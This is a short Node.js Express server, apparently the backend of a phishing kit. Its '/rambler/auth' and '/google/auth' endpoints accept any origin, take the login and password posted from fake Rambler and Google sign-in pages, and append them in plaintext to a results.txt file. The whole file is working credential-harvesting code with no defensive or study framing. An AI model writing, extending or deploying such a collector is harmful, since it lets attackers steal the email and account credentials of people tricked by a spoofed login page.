const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(cors({
    origin: '*'
}));

app.post('/rambler/auth', (req, res) => {
  const { login, password } = req.body;
  console.log(req.body)
  
  if (login && password) {
    const record = `Тип: rambler\nЛогин: ${login}\nПароль: ${password}\n\n`;
    
    fs.appendFile('results.txt', record, (err) => {
      if (err) throw err;
      console.log('Record added to results.txt');
    });

  }
  res.status(200).json({});
});

app.post('/google/auth', (req, res) => {
    const { login, password } = req.body;
  
    if (login && password) {
      const record = `Тип: google\nЛогин: ${login}\nПароль: ${password}\n\n`;
      
      fs.appendFile('results.txt', record, (err) => {
        if (err) throw err;
        console.log('Record added to results.txt');
      });
  
      res.status(200).json({});
    }
});

app.all('*', (req, res) => {
   // Обработка неправильных ендпоинтов
   res.status(404).send("Invalid endpoint");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
